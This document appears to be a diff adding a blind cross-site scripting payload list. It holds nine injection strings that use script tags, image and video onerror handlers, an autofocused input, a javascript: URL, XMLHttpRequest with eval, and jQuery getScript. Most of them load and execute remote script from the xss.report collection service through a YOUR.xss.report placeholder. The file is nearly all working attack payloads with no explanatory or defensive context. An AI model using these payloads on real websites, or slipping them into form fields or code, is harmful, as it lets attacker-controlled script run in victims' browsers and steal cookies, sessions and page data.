@@ -1,0 +1,9 @@
+"><script src=https://xss.report/c/YOUR.xss.report></script>
+"><img src=https://xss.report/c/YOUR.xss.report onerror=alert(1);>
+"><img src=https://xss.report/c/YOUR.xss.report id=YOUR.xss.report; onerror=eval(atob(this.id))>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/YOUR.xss.report\';document.body.appendChild(a)')
+"><input onfocus=eval(atob(this.id)) id=YOUR.xss.report; autofocus>
+"><video><source onerror=eval(atob(this.id)) id=dYOUR.xss.report;>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/YOUR.xss.report");a.send();</script>
+<script>$.getScript("//xss.report/c/YOUR.xss.report")</script
+var a=document.createElement("script");a.src="https://xss.report/c/YOUR.xss.report";document.body.appendChild(a);
